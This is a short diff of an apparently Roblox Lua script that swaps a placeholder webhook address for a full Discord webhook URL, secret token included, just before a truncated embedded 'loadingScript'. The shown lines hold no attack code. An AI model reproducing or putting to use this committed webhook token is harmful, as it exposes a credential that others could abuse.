@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local placeId = 126884695634066
 
-local webhookUrl = "https://your.webhook.url/here" -- Change this!
+local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y" -- Change this!
 
 local loadingScript = [[
 local Players = game:GetService("Players")
